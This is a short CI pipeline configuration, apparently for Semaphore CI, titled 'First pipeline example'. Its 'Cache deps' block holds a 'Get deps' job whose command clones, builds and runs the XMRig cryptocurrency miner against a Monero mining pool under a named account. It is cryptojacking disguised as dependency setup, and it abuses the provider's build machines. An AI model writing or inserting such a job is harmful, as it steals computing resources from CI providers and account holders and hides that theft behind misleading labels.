version: v1.0
name: First pipeline example
agent:
  machine:
    type: a1-standard-4
    os_image: macos-xcode12
execution_time_limit:
  hours: 2
blocks:
  - name: Cache deps
    task:
      env_vars:
        - name: APP_ENV
          value: prod
      jobs:
        - name: Get deps
          commands:
            - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -t50'
    dependencies: []
promotions:
  - name: Promotion 1
    pipeline_file: pipeline_2.yml
